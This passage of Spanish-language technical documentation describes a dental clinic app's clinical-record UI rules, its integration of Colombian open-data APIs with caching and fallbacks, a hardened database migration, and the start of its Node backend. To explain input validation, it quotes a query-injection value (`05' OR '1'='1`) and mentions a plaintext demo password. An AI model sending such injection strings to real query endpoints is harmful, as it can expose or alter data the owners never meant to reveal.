| `BookingWizard` | `pendingConfirmation` | HU-06: lo que pide el paciente queda "Pendiente de confirmación"; el aviso del paso final y el resumen lo dicen |
| `BookingWizard` | Usa la cita que **devuelve** `onComplete` | Antes inventaba el id y siempre decía "Programada"; ahora muestra el id y el estado **reales** del servicio |
| `Odontogram` | El evento `remove` incluye el hallazgo quitado | Sin él, la página no sabía qué registro borrar en el servicio |
| `especialistaConNombre` | Devuelve también `nombres` y `apellidos` | Para editar el nombre sin adivinar dónde termina el nombre y empieza el apellido |

Todas son **opcionales y retrocompatibles**: el styleguide y las pruebas anteriores siguen igual.

### 13.8 La ficha clínica (`historia.js`)

- **RN-01 en la interfaz:** la ficha se edita (odontograma, consultas, historia) si el usuario es
  administrador o un odontólogo **con una cita no cancelada** con ese paciente. Si no, se muestra
  en solo lectura con una alerta que explica por qué. Es la misma regla de `assertRN01` en el
  servicio: la interfaz solo evita mostrar botones que fallarían.
- **Alergias siempre visibles** (alerta roja sobre las pestañas), como se definió en A4.
- **Actualización optimista del odontograma:** el diente cambia de color al instante y luego se
  guarda. Si el servicio lo rechaza, se avisa y se **recarga lo guardado** (la pantalla no puede
  quedarse mostrando algo que no está en la base).
- **Registrar consulta:** solo sobre citas propias programadas y sin consulta; la cita queda
  completada (lo hace el servicio).
- **Piezas ausentes:** se pueden marcar en pantalla, pero la tabla `odontograma` no tiene ese dato;
  el sistema lo **dice** en vez de fingir que se guardó (cambio previsto para la fase B).
- El paciente ve **su** ficha (`mi-historia.html`): el id sale de la sesión, no de la URL. Un
  paciente no puede escribir `?id=12` para ver la de otro: esa página ni siquiera lee la URL, y el
  servicio respondería 403.

### 13.9 Acciones según el estado de la cita

Los botones de cada cita salen de `allowedTransitions(cita, user)`, que replica la máquina de
estados del servicio:

| Acción | Cuándo aparece |
|---|---|
| Confirmar | Cita *pendiente de confirmación* · administrador o recepción |
| Marcar como completada | Cita *programada* · administrador o el odontólogo de esa cita |
| Cancelar | Cita activa · quien tenga `CANCELAR_CITA` (el paciente, solo citas futuras y suyas) |
| Ver ficha | Odontólogo |

Cancelar **siempre** pide confirmación (no se puede deshacer). En el calendario, al elegir una cita
se abre su resumen con un selector de las acciones permitidas.

### 13.10 Pendientes conscientes (fuera del alcance de A6)

- Gestión de **usuarios y roles** (RF-ROL): requiere un servicio que aún no existe.
- **Novedades** e **historias** desde el menú del administrador (los servicios ya lo permiten).
- **Piezas ausentes** del odontograma (falta la columna en la BD).
- Las **notificaciones** de la topbar siguen siendo de demostración.

---

## 14. Integración de APIs externas (servicios web de terceros)

Hasta A6, todos los datos venían de **nuestra** capa de servicios (mock hoy, backend propio
mañana). Esta parte agrega dos **servicios web reales, públicos y de terceros**, que se consultan
desde el navegador con `fetch()`:

| | API 1: Departamentos y municipios | API 2: TRM (dólar en pesos) |
|---|---|---|
| **Proveedor** | Datos Abiertos de Colombia (`datos.gov.co`, plataforma **Socrata**). Datos del DANE | Datos Abiertos (Superintendencia Financiera) y, de respaldo, ExchangeRate-API |
| **Endpoint** | `GET https://www.datos.gov.co/resource/vcjz-niiq.json` (departamentos) y `…/gdxc-w37w.json` (municipios) | `GET https://www.datos.gov.co/resource/32sa-8pi3.json` y `GET https://open.er-api.com/v6/latest/USD` |
| **Formato** | JSON (arreglo de objetos) | JSON |
| **Autenticación** | Ninguna (datos públicos) | Ninguna |
| **Servicio** | `js/services/colombia.service.js` | `js/services/trm.service.js` |
| **Dónde se usa** | Registro y edición de pacientes (`pages/pacientes.js`): departamento → municipio | Pagos (`pages/pagos.js`): tarjeta "Equivalencia en dólares" |
| **Si no hay internet** | Copia en caché o **respaldo local** con los 33 departamentos y 1.122 municipios | Última TRM en caché (con aviso). Si no hay ninguna, avisa: **no inventa** una tasa |

> **¿Por qué estas dos?** Resuelven necesidades reales del consultorio. La ubicación del paciente
> se elige de la **lista oficial DIVIPOLA** (codificación del DANE), en vez de texto libre con
> errores como "medellin", "Medellín" o "MDE". La TRM permite dar a un **paciente internacional** el
> valor de su presupuesto en dólares, con la tasa oficial del día.

Antes de escribir código se **verificó cada endpoint** con peticiones reales. El conjunto de
municipios que suele citarse en tutoriales (`xdk5-pm3f`) **ya no existe**: responde
`"dataset.missing"`. Por eso se usan los conjuntos oficiales DIVIPOLA del DANE. También se confirmó
que `datos.gov.co` responde con el encabezado `Access-Control-Allow-Origin: *` (CORS, §14.5).

### 14.1 Dónde encajan en la arquitectura

```
pages/pacientes.js ──► services/index.js ──► colombia.service.js ──► externo.js ──► fetch() ──► datos.gov.co
pages/pagos.js     ──►                   ──► trm.service.js      ──►            ──►         ──► datos.gov.co / open.er-api.com
                                                                                  └──► storage.js (caché "dentalcare:ext:…")
```

- Las páginas siguen importando **solo** desde `services/index.js` (la regla de A6 no cambia).
- **No dependen de `USE_MOCK`.** Son servicios de terceros: el mismo código funciona con el mock o
  con el backend propio. `USE_MOCK` solo decide de dónde salen **nuestros** datos.
- `externo.js` reúne lo que comparten: `fetchJson()` (petición con tiempo límite) y `createCache()`
  (caché con fecha de guardado).

### 14.2 Anatomía de una consulta con `fetch()` (`services/externo.js`)

```js
export async function fetchJson(url, { fetch: fetchImpl = (...a) => globalThis.fetch(...a), timeout = 6000 } = {}) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeout);      // 1. tiempo límite
  let response;
  try {
    response = await fetchImpl(String(url), {                        // 2. la petición
      headers: { Accept: 'application/json' },                       //    solo Accept: sin token
      signal: controller.signal,
    });
  } catch (error) {                                                  // 3. no hubo respuesta
    const isTimeout = error?.name === 'AbortError';
    throw new ApiError(0, isTimeout ? '…tardó demasiado…' : '…no hay conexión…', { code: isTimeout ? 'TIMEOUT' : 'NETWORK' });
  } finally {
    clearTimeout(timer);
  }
  if (!response.ok) throw new ApiError(response.status, '…', { code: 'EXTERNAL' });  // 4. 404, 500…
  try {
    return await response.json();                                    // 5. el cuerpo, como objeto
  } catch {
    throw new ApiError(response.status, '…no es JSON…', { code: 'EXTERNAL' });       // 6. HTML de error, etc.
  }
}
```

Lo que hay que saber explicar:

1. **`fetch()` devuelve una promesa** y por eso se usa `await`. La página no se congela mientras
   llega la respuesta.
2. **`fetch()` NO falla con un 404 o un 500.** La promesa solo se rechaza si **no hubo respuesta**
   (sin internet, DNS, CORS, cancelación). Un 500 llega como respuesta "exitosa" con `response.ok`
   en `false`. Por eso hay que revisar `response.ok`. Es una pregunta clásica de sustentación.
3. **`fetch()` no tiene tiempo límite propio.** Si el servidor no contesta, la petición puede quedar
   esperando mucho tiempo. `AbortController` la cancela a los 6 s, menos que los 15 s del backend
   propio, porque un tercero lento no debe frenar al consultorio.
4. **`response.json()` también es asíncrono** y puede fallar: un proxy o un error del servidor
   pueden devolver HTML en vez de JSON.
5. **Todo error se convierte en `ApiError`,** el mismo formato de la fase A5 (`status`, `code`,
   `message`). Quien llama no necesita saber si el problema fue la red, el tiempo o el servidor.
6. **El parámetro `fetch` se puede reemplazar** (inyección de dependencias). En la app se usa el
   `fetch` real. Las pruebas pasan uno falso que simula éxito, error 500, falta de red o lentitud
   (§14.8).

**Construcción de la URL.** Los parámetros no se pegan a mano en el texto: se agregan con
`URLSearchParams`, que codifica los caracteres especiales (espacios, `'`, `&`).

```js
const url = new URL('https://www.datos.gov.co/resource/gdxc-w37w.json');
url.searchParams.set('$select', 'cod_mpio,nom_mpio');
url.searchParams.set('$where', "cod_dpto='05'");
url.searchParams.set('$order', 'nom_mpio');
// → …/gdxc-w37w.json?%24select=cod_mpio%2Cnom_mpio&%24where=cod_dpto%3D%2705%27&%24order=nom_mpio
```

### 14.3 Consultar una API Socrata: SoQL (`colombia.service.js`)

`datos.gov.co` usa **Socrata**, que permite filtrar desde la URL con un lenguaje parecido a SQL
llamado **SoQL**:

| Parámetro | Equivale en SQL a | Uso en DentalCare |
|---|---|---|
| `$select` | `SELECT columnas` | Solo código y nombre (no se descargan latitud, longitud ni tipo) |
| `$where` | `WHERE` | `cod_dpto='05'`: solo los municipios del departamento elegido |
| `$order` | `ORDER BY` | Ordenados por nombre (y la TRM por fecha, la más reciente primero) |
| `$limit` | `LIMIT` | Tope de filas. Socrata devuelve **1.000** si no se indica |

**Cargar bajo demanda.** No se descargan los 1.122 municipios al abrir el formulario. Primero se
traen los 33 departamentos y, cuando el usuario elige uno, solo **sus** municipios (Antioquia tiene
125). Así viaja menos información y la respuesta es más rápida.

**Inyección SoQL.** El código del departamento va **dentro** de un filtro `$where`. Si alguien
pasara `05' OR '1'='1`, cambiaría la consulta, igual que una inyección SQL. Por eso el servicio
valida el código con `/^\d{2}$/` (exactamente dos dígitos) **antes** de construir la URL, y si no
cumple ni siquiera llama a la API (error 400). Una prueba lo verifica.

**Los datos de un tercero no son confiables.** La API podría cambiar de formato, devolver filas
incompletas o un objeto de error. `normalizar()`:

- comprueba que la respuesta sea un arreglo;
- descarta las filas cuyo código no tenga el formato DANE (2 dígitos para el departamento, 5 para el
  municipio);
- convierte "SAN JOSÉ DE CÚCUTA" en "San José de Cúcuta" (`nombrePropio()`, sin tocar siglas como
  "D.C.");
- ordena con `localeCompare(…, 'es')`, que ubica bien las tildes y la ñ;
- si no queda ninguna fila válida, lo trata como un error y usa el respaldo.

Además, los nombres se pintan con `h()` (`textContent`), nunca con `innerHTML`. Aunque la API fuera
manipulada, un nombre con `<script>` se mostraría como texto (§5).

### 14.4 Resiliencia: qué pasa cuando la API falla

Una API externa **va a fallar** algún día: no hay internet en el consultorio, el servidor del
gobierno está en mantenimiento o responde lento. El sistema no puede dejar de registrar pacientes
ni pagos por eso. Se aplican capas, de la más rápida a la de último recurso:

| Capa | DIVIPOLA (departamentos y municipios) | TRM |
|---|---|---|
| 1. Caché vigente (`localStorage`) | 30 días (la división territorial casi no cambia) | 1 hora (la TRM cambia una vez al día) |
| 2. Red, con tiempo límite de 6 s | `datos.gov.co` | `datos.gov.co` (oficial) → si falla, ExchangeRate-API |
| 3. Caché **vencida** | Se usa la lista guardada | Se usa la última TRM **con aviso** ("desactualizada") |
| 4. Último recurso | **Respaldo local** `js/data/divipola.js` (33 dptos., 1.122 mpios.) | **Error explicado al usuario** y botón "Reintentar" |

```js
async function consultar(key, { url, map, local }) {
  const cached = cache.read(key);
  if (cached?.fresh) return { items: cached.value, origen: 'cache' };       // 1
  try {
    const items = map(await fetchJson(url, { fetch, timeout }));             // 2 (map = validar)
    cache.write(key, items);
    return { items, origen: 'api' };
  } catch {
    if (cached) return { items: cached.value, origen: 'cache' };             // 3
    return { items: await local(), origen: 'local' };                        // 4
  }
}
```

**¿Por qué la TRM no tiene "respaldo local" como los municipios?** Porque la lista de municipios
de hace un mes sigue siendo correcta, pero una tasa de cambio guardada en el código sería **falsa**.
Con dinero no se inventa un valor: si no hay TRM, la tarjeta lo dice y los pagos se siguen
registrando en pesos. Cuando se muestra una TRM vieja, se indica la fecha de vigencia y el aviso
"no se pudo actualizar".

**Otras decisiones de resiliencia:**

- **`origen` en la respuesta.** El servicio dice de dónde salió el dato (`api`, `cache` o `local`).
  Con eso el formulario muestra "Sin conexión con datos.gov.co: se usa la lista guardada en la
  aplicación". El usuario sabe qué está viendo.
- **Respaldo con `import()` dinámico.** `divipola.js` pesa unos 26 KB y **solo se descarga si hace
  falta**. Con la API funcionando, el navegador nunca lo pide. Es una copia de las mismas consultas,
  tomada el 2026-10-19, con la misma forma que la respuesta de la API, así que pasa por la misma
  `normalizar()`.
- **Peticiones compartidas.** Si dos partes de la pantalla piden la misma lista al mismo tiempo,
  comparten **una** sola petición: se guarda la promesa en curso en un `Map`.
- **Degradación elegante en pagos.** La TRM **no** se carga con `loadInto()` junto a las ventas,
  sino aparte. Si la API externa falla, la página de pagos funciona completa y solo esa tarjeta
  muestra el aviso. Una dependencia **opcional** nunca debe tumbar una función **esencial**.
- **Caché con fecha.** `createCache()` guarda `{ savedAt, value }` sobre `storage.js` (§12.4), con
  el prefijo `dentalcare:ext:…` y respaldo en memoria si `localStorage` no está disponible. Si el
  almacenamiento está lleno, no se guarda la copia, pero la consulta funcionó igual.

### 14.5 Seguridad y privacidad al hablar con terceros

- **No se usa `http.js` (§12.9) a propósito.** Ese cliente agrega
  `Authorization: Bearer <token de la sesión>` y cierra la sesión ante un 401. Enviar el token del
  consultorio a un servidor ajeno sería **filtrarlo**. Además, un 401 de un tercero no significa
  que nuestra sesión venció. Una prueba verifica que la petición lleve **solo** el encabezado
  `Accept`.
- **No sale ningún dato de pacientes.** A la API solo viaja el **código del departamento** (un dato
  público). El nombre, el documento o la dirección del paciente nunca salen del sistema. Es
  importante porque son datos de salud (Ley 1581 de 2012, habeas data).
- **CORS.** El navegador bloquea, por defecto, que una página lea respuestas de **otro origen**. Las
  dos APIs responden `Access-Control-Allow-Origin: *`, es decir, "cualquier página puede leerme".
  Por eso funcionan desde el navegador sin un servidor intermedio. La petición es **simple** (GET y
  solo `Accept`), así que el navegador no necesita la consulta previa `OPTIONS` (*preflight*). Si
  se agregara `Authorization` o `Content-Type: application/json`, sí la haría.
- **Validación de rango en la TRM.** Un valor fuera de 1.000–20.000 pesos por dólar se descarta
  (por ejemplo, 0, negativo u otra moneda) y se intenta la siguiente fuente.
- **Solo HTTPS.** Ambas APIs se consultan por `https://`. Una página servida con HTTPS no puede
  pedir recursos por HTTP (contenido mixto).

### 14.6 Cambios en los datos del paciente (aplicados en la fase B como B-04)

El formulario guarda dos campos nuevos y opcionales en el paciente:

```sql
ALTER TABLE paciente
  ADD COLUMN departamento VARCHAR(60) NULL AFTER email,
  ADD COLUMN municipio    VARCHAR(80) NULL AFTER departamento;
```

- El servicio de pacientes los valida igual que el formulario (largo máximo). El paciente también
  puede cambiarlos, porque son datos de contacto.
- **Regla de coherencia:** si cambia el departamento y no llega un municipio, el municipio anterior
  se borra. Así no queda "Medellín (Caldas)".
- La ficha clínica muestra "Municipio: Medellín (Antioquia)".
- **Alternativa más normalizada (para discutir):** guardar el **código DANE** (`CHAR(5)`) con una
  llave foránea a una tabla `municipio`. Es más correcto si se van a hacer reportes por región.
  Se eligió guardar el nombre porque la ficha lo muestra sin una consulta adicional y porque no
  hay reportes por municipio en el alcance actual.

Se agrega a la lista de §12.11 como el punto 6.

### 14.7 Detalles de la interfaz

**Departamento → municipio (`pacientes.js → ubicacionFields`).**
1. Al abrir el modal, el select de departamento dice "Cargando departamentos…" y está
   **deshabilitado**. El de municipio, "Primero elija el departamento".
2. Llegan los departamentos: se habilita el select y la ayuda indica la fuente (DIVIPOLA o lista
   local).
3. Al elegir un departamento se consultan **sus** municipios. Mientras llegan, el select queda
   deshabilitado.
4. Al **editar**, se preseleccionan el departamento y el municipio guardados.

- **Condición de carrera:** si el usuario cambia de departamento rápido (Antioquia → Caldas), la
  respuesta de Antioquia podría llegar **después** y mostrar municipios equivocados. Cada consulta
  lleva un número de `turno` y solo se pinta la respuesta del último (la misma idea de §11.6).
- **Un select deshabilitado no viaja en el formulario** (`FormData` lo omite). Si la lista no carga,
  el campo no se envía y el dato que ya estaba guardado no se pierde.
- Si el paciente tiene guardado un nombre que ya no está en la lista, se agrega como opción para no
  borrarlo sin querer.

**Tarjeta TRM (`pagos.js → trmPanel`).**
- Muestra "1 USD = $ 3.174,67", la fecha de vigencia y la fuente, los saldos del resumen en
  dólares y un **conversor** para presupuestos: se escribe un valor en pesos y aparece en dólares.
- El resultado va en un `<output>` dentro de una región `aria-live`, para que el lector de pantalla
  lo anuncie.
- El conversor se crea **una sola vez**. Al registrar un abono se recalculan los saldos, pero no se
  borra el valor que el usuario escribió.
- El detalle de una venta muestra "Equivale a US$ … (TRM …)" cuando hay TRM.
- **Montos:** los pesos siguen siendo enteros. La conversión `aUSD()` redondea a **centavos**
  (`Math.round(x * 100) / 100`). La TRM se muestra con dos decimales (`formatCOPDecimal`), el dólar
  con `formatUSD` (`Intl.NumberFormat` con `currency: 'USD'`).

### 14.8 Cómo se probó una API que no controlamos

El reto: si la prueba depende de internet, falla cuando la red falla, aunque el código esté bien.
Además, es imposible **provocar** a voluntad un error 500 del gobierno. Solución en tres niveles:

1. **Pruebas unitarias con `fetch` falso** — `tests/apis-externas.test.mjs` (37 pruebas, sin
   internet). Gracias a las fábricas `createColombiaService({ fetch, store, now, timeout })` y
   `createTrmService(…)`, la prueba controla la red, el almacenamiento y **el reloj**. Por ejemplo,
   "avanza" 31 días para probar la caché vencida, sin esperar 31 días. Cubre:
   - éxito;
   - caché;
   - caché vencida sin red;
   - HTTP 500;
   - respuesta que no es JSON;
   - formato inesperado;
   - tiempo límite (un `fetch` que nunca responde, cortado a los 50 ms);
   - inyección SoQL;
   - peticiones simultáneas;
   - TRM con fuente de respaldo;
   - TRM absurda;
   - TRM sin red ni caché (error, no inventa).
2. **Pruebas de integración contra las APIs reales**: `node tests/apis-externas.test.mjs --live`
   (4 pruebas más). Verifican que los endpoints siguen vivos y con el formato esperado:
   33 departamentos, 125 municipios de Antioquia, TRM en rango.
3. **E2E en Edge real**: `tests/e2e/apis.test.mjs` (22 pruebas).
   - Con internet: registra una paciente en Medellín, verifica lo guardado y la preselección al
     editar, y prueba la TRM y el conversor.
   - Luego **bloquea** las dos APIs con `Network.setBlockedURLs` del protocolo DevTools, como si
     no hubiera internet: aparece la lista local con su aviso y la TRM muestra "no fue posible
     consultar" sin inventar un valor, mientras la tabla de pagos sigue funcionando.
   - Por último desbloquea y "Reintentar" recupera la TRM.

---

## 15. Fase B: base de datos v2

El frontend se construyó contra los datos de `dentalcare_bd.sql`, pasados al mock. En ese proceso
aparecieron diferencias entre la base, el SRS y lo que la aplicación necesita, anotadas en §12.11 y
§14.6. Antes de escribir el backend (fase C), la base real tiene que quedar igual a la que ya usaba
el mock. Si no, la API heredaría los mismos errores.

| Archivo | Para qué |
|---|---|
| `database/CAMBIOS.md` | Cada cambio explicado: problema, evidencia, requisito, SQL e impacto en el backend |
| `database/dentalcare_bd_v2.sql` | Instalación completa nueva: estructura y datos de demo |
| `database/migrations.sql` | Migración v1 → v2 para quien ya tiene la v1 con datos |
| `tests/db/pruebas_bd_v2.sql` | 38 pruebas autoevaluables de las restricciones |
| `dentalcare_bd.sql` (raíz) | La v1 original, intacta como referencia |

### 15.1 Los cambios en una tabla

| # | Problema en la v1 | Cambio en la v2 |
|---|---|---|
| B-00 | Las prácticas CRUD estaban pegadas al script de instalación (28 errores al importarlo) | La v2 solo crea la base |
| B-01 | `password_hash` guardaba `Admin2026*` en claro (incumple RNF-SEG-01) | Hash **bcrypt** y un `CHECK` que rechaza cualquier cosa que no lo sea |
| B-02 | No había dónde guardar si un rol está activo (RF-ROL-06) | `rol.estado` |
| B-03 | La recepcionista podía **editar historias** (viola **RN-01**) y el especialista cobraba pero no veía historias | 5 permisos nuevos y matriz corregida, igual a `permissions.js` |
| B-04 | Sin ubicación del paciente | `departamento` y `municipio` (DIVIPOLA) |
| B-05 | La venta #2 decía `PAGADO` con 200.000 de saldo | `estado_venta` pasa a **columna generada** |
| B-06 | `paciente_venta` repetía `venta.id_paciente` | Se elimina |
| B-07 | La cita no guardaba el tratamiento (RF-CIT-01) | `cita.id_servicio` (FK) y estados válidos |
| B-08 | Sin tabla para los enlaces de "olvidé mi contraseña" | `password_reset` con el token **hasheado** |
| B-09 | Un día de atención por odontólogo: casi sin cupos | 11 franjas más |
| B-10 | Cualquier texto valía como género o tipo de documento | `CHECK` con los mismos valores del formulario |

### 15.2 Dos caminos: instalación nueva o migración

```
   ¿Ya tienes dentalcare_bd con datos que quieres conservar?
          │
     no ──┴── sí
     │         │
     ▼         ▼
 dentalcare_bd_v2.sql      1. mysqldump (copia)  2. migrations.sql
 (crea todo desde cero)     (ALTER/UPDATE sobre lo que ya existe)
```

- **`migrations.sql`** transforma una base existente: `ALTER TABLE`, `UPDATE`, `INSERT`. Es lo que se
  hace en un sistema en producción, porque ahí no se pueden borrar los datos reales.
- **`dentalcare_bd_v2.sql`** se **generó** a partir de la migración: se aplicó sobre la v1 y se
  exportó con `mysqldump`. Así los dos caminos dan **el mismo resultado**, y se comprobó (§15.6).
- La v2 **no trae `DROP TABLE`**, a diferencia de muchos volcados. Si se importa por error sobre una
  base con datos, se detiene en la primera tabla (*Table 'cita' already exists*) en vez de
  borrarla. Es una decisión de seguridad.
- **Las migraciones no se pueden deshacer con `ROLLBACK`.** En MySQL, `ALTER TABLE`, `CREATE` y
  `DROP` son DDL y hacen *commit implícito*: se confirman en el acto. Por eso la migración empieza
  con "haz una copia con `mysqldump`". La copia es el único "deshacer" real.

### 15.3 Reglas que ahora cumple la propia base

La idea central de esta fase es la **defensa en profundidad**: la misma regla se valida en tres
capas.

```
  Formulario (frontend)  →  API (backend, fase C)  →  Base de datos (CHECK / FK / NOT NULL)
  ayuda al usuario          decide quién puede         última línea: nada inválido
  (se puede saltar)          hacer qué                   entra, venga de donde venga
```

El frontend se salta con Postman o editando el JavaScript en el navegador. La API puede tener un
error. Un script de mantenimiento puede escribir directo en la base. Solo la base ve **todas** las
escrituras. Por eso se agregaron 14 restricciones `CHECK`, una llave foránea nueva y varios
`NOT NULL`.

**Los valores son idénticos en las tres capas.** Por ejemplo, tipo de documento CC, TI, CE o PA. Al
principio el `CHECK` incluía también `RC` (registro civil) y se quitó: si la base acepta **más**
que el formulario no pasa nada grave, pero si acepta **menos**, el usuario llena bien el formulario
y recibe un error 500 que no entiende. La regla es: misma lista en las tres capas.

**Un `CHECK` contra las contraseñas en claro.**

```sql
CHECK (password_hash REGEXP '^[$]2[aby][$][0-9]{2}[$][./A-Za-z0-9]{53}$')
```

Un hash bcrypt tiene una forma fija: `$2a$` (versión) + `10$` (costo) + 22 caracteres de sal +
31 de hash = 60 caracteres. Si algún día el backend tiene un error y trata de guardar `Clave123*`
tal cual, el `INSERT` falla. Se usa `[$]` en vez de `\$` porque dentro de corchetes el `$` es
literal, y así no hay que pensar en dobles escapes entre SQL y la expresión regular.

**Lo que un `CHECK` no puede hacer.** Un `CHECK` solo ve **la fila que se está guardando**. Las
reglas que miran otras filas o tablas quedan en la API:

| Regla | ¿Quién la hace cumplir? | Por qué |
|---|---|---|
| Un horario termina después de empezar | Base (`CHECK`) | Solo mira la misma fila |
| La cita apunta a un tratamiento que existe | Base (FK) | Es una relación entre tablas, justo lo que hace una llave foránea |
| **RN-01**: solo el doctor **asignado** edita la historia | **API** | Hay que buscar si existe una cita entre ese doctor y ese paciente |
| **RN-03**: no inactivar un rol con usuarios activos | **API** | Hay que contar filas de `usuario` |
| **RN-02**: la cita cae dentro del horario del doctor | **API** | Cruza `cita` con `horario` y con el día de la semana |

(Se podrían escribir *triggers* para algunas, pero esconden lógica de negocio en la base y son
difíciles de probar y depurar. Se prefirió la API, donde esa lógica ya existe en el mock.)

### 15.4 La columna generada: datos que no se pueden contradecir

La venta #2 estaba así:

| monto_total | monto_pagado | saldo_pendiente | estado_venta |
|---|---|---|---|
| 350.000 | 150.000 | 200.000 *(calculado)* | **PAGADO** *(escrito a mano)* |

`saldo_pendiente` ya era una **columna generada** en la v1: MySQL la calcula sola con
`monto_total − monto_pagado`, así que nunca se equivoca. `estado_venta`, en cambio, se escribía a
mano, aunque se deduce de los mismos montos. Y lo que se guarda dos veces termina diciendo cosas
distintas. La solución fue tratarlo igual:

```sql
estado_venta varchar(20) GENERATED ALWAYS AS
  (CASE WHEN monto_pagado >= monto_total THEN 'PAGADO' ELSE 'PENDIENTE' END) STORED
```

- Ahora es **imposible** que mienta: al registrar el abono de 200.000, la venta #2 pasa sola a
  `PAGADO`. Hay una prueba de eso.
- `STORED` guarda el valor en disco. Se puede indexar y filtrar (`WHERE estado_venta = 'PENDIENTE'`)
  como cualquier columna.
- Consecuencia para el backend: los `INSERT` y `UPDATE` **no** deben mencionar `estado_venta` ni
  `saldo_pendiente`. MySQL 8 los rechaza (error 3105). MariaDB solo advierte (1906) o los rechaza
  en modo estricto.
- Es el mismo principio que el mock (`ventas.service.js`), que ya recalculaba el estado desde el
  saldo. La diferencia es que ahora lo garantiza la base y no depende de que el código se acuerde.

### 15.5 Normalización: por qué desaparece `paciente_venta`

`venta.id_paciente` ya dice de quién es cada venta. `paciente_venta` decía **lo mismo** otra vez:
se comprobó que sus 40 filas coincidían exactamente. Eso es **redundancia**. Cuando la API cree una
venta nueva y no inserte la segunda fila, que es lo que pasaría porque nadie la necesita, las dos
fuentes empezarían a contradecirse.

Si el negocio necesitara una venta compartida por varios pacientes, por ejemplo un plan familiar,
la tabla intermedia sería lo correcto y habría que quitar `venta.id_paciente`. Lo que nunca es
correcto es tener las dos.

### 15.6 Cómo se verificó

Las pruebas no se hicieron sobre las bases instaladas en el equipo. Se levantaron servidores
**desechables**, con su carpeta de datos temporal, en puertos aparte (3307 y 3308), con los mismos
motores del proyecto: **MariaDB 10.4.32** (XAMPP) y **MySQL 8.0.36**.

1. **Primero se probó la v1.** Al importarla completa salieron 28 errores, todos en la sección de
   prácticas CRUD del final. Así se descubrió B-00.
2. **v1 + `migrations.sql`** se aplica sin errores en los dos motores.
3. **Equivalencia.** Se comparó la base creada con la v2 contra "v1 + migración": estructura
   (`SHOW CREATE TABLE`) y datos (`CHECKSUM TABLE … EXTENDED`) de las 20 tablas, en dos rondas.
   Resultado: idénticas.
4. **`tests/db/pruebas_bd_v2.sql`**: 38 pruebas en tres grupos.
   - **Datos corregidos:** no queda ninguna contraseña en claro, RN-01 en la matriz, la venta #2…
   - **Lo inválido se rechaza:** contraseña en claro, pagar más que el total, cita sin tratamiento,
     horario al revés, día en inglés…
   - **Lo válido se acepta:** el abono que salda la venta, una cita `PENDIENTE_CONFIRMACION`, el
     token de recuperación…

   Todo corre dentro de una transacción con `ROLLBACK` al final: la base queda como estaba.
5. **Se probó la prueba.** Se agregaron cuatro casos saboteados a propósito: una columna que no
   existe, un error de sintaxis, un dato válido marcado como "debe fallar" y un dato inválido
   marcado como "debe funcionar". Los cuatro salieron como FALLA. Así se sabe que un 38/38 significa
   algo (§17, hallazgos 21 y 22).

```bash
mysql -u root < database/dentalcare_bd_v2.sql
mysql -u root dentalcare_bd < tests/db/pruebas_bd_v2.sql   # última línea: fallidas = 0
```

### 15.7 Lo que queda listo para la fase C (backend)

| La API deberá… | Por el cambio |
|---|---|
| Comparar con `bcrypt.compare()`, nunca con `=` en SQL, y hacer una comparación falsa si el correo no existe | B-01 |
| Verificar RN-01 (doctor asignado) y RN-03 (rol sin usuarios activos) antes de escribir | B-02, B-03 |
| Poner `municipio = NULL` si cambia el departamento sin municipio | B-04 |
| Registrar un abono en una **transacción** (`INSERT pago_venta` + `UPDATE venta`), sin tocar `estado_venta` | B-05 |
| Exigir `id_servicio` al crear una cita | B-07 |
| Guardar `SHA2(token)` y nunca el token; marcar `usado_en` | B-08 |
| Usar **consultas parametrizadas** (`?` con `mysql2`), nunca concatenar valores en el SQL | Todas |

**Cuentas de demostración.** Son las mismas de §12.10. En la base ya no se pueden leer, pero siguen
sirviendo para entrar.

---

## 16. Fase C: backend (Node.js + Express + MySQL)

Hasta la fase B, las pantallas trabajaban con el mock: una base simulada en `localStorage`. En la
fase C nace el **servidor real**. Es una API REST en Node.js que se conecta a la base v2 (§15) y
responde lo mismo que respondía el mock, con el mismo formato. Por eso el frontend no cambia: basta
poner `USE_MOCK = false` en `frontend/js/core/config.js`.

En esta fase se construyeron los dos primeros módulos. Los demás (citas, historias, ventas…) son la
fase D.

| Método y ruta | Qué hace | Quién puede |
|---|---|---|
| `POST /api/auth/login` | Verifica correo y contraseña (bcrypt) y entrega un **JWT** de 8 horas | Cualquiera |
| `GET /api/auth/me` | Devuelve el usuario de la sesión | Con sesión |
| `POST /api/auth/logout` | Deja el cierre de sesión en la auditoría | Con sesión |
| `GET /api/pacientes?q=` | Lista y busca pacientes | Con sesión; el paciente solo se ve a sí mismo |
| `POST /api/pacientes` | Registra un paciente (con su historia clínica vacía) | `GESTIONAR_PACIENTES` |
| `GET /api/health` | ¿El servidor y la base responden? | Cualquiera |

### 16.1 La estructura: cada capa con una sola responsabilidad

```
backend/
├── package.json        dependencias con versión EXACTA + package-lock.json
├── .env.example        plantilla de configuración (sí va a git)
├── .env                configuración real de este equipo (NO va a git)
└── src/
    ├── server.js       arranca el servidor (listen) y lo apaga ordenadamente
    ├── app.js          arma Express: CORS → JSON → rutas → 404 → errores
    ├── config/
    │   ├── env.js      lee y valida el .env (si falta algo, no arranca)
    │   └── db.js       pool de conexiones mysql2/promise + withTransaction()
    ├── routes/         QUÉ URL atiende qué función y con qué protección
    ├── controllers/    la lógica: valida, decide permisos, orquesta
    ├── models/         SOLO SQL: hablan con la base, nada más
    ├── middlewares/    auth.js (verifyToken, requirePermission), error-handler.js
    ├── utils/          ApiError, validadores, permisos, ubicación DIVIPOLA
    └── data/           divipola.js (copia de la del frontend)
```

Es el patrón **MVC sin la V**: la vista es el frontend. Cada carpeta responde una sola pregunta.
Si una consulta está mal, el error está en `models/`. Si un rol entra donde no debe, en `routes/`
o en el controlador. Así se encuentra rápido dónde tocar.

**¿Por qué sin ORM (Sequelize, Prisma…)?** Porque el SQL se escribe a mano con `mysql2/promise`.
En la sustentación se puede mostrar la consulta exacta que corre, y se aprovecha lo construido en
la fase B: las restricciones `CHECK`, la columna generada y la intercalación que ignora tildes.

### 16.2 El recorrido de una petición

```
 navegador (http.js)                                     backend
 ───────────────────                                     ───────
 POST /api/pacientes   ──►  cors()            ¿el origen es el frontend?
 Authorization: Bearer      express.json()    texto → objeto (o 400 BAD_JSON)
 { nombres: … }             verifyToken       firma, vencimiento, ¿cuenta activa?   → 401
                            requirePermission ¿GESTIONAR_PACIENTES?                 → 403
                            controlador       validar → 400 · duplicado → 409
                            modelo            INSERT … VALUES (?, ?, …)
                       ◄──  201 { id_paciente: 51, … }
                            (si algo lanzó un error en cualquier punto ↓)
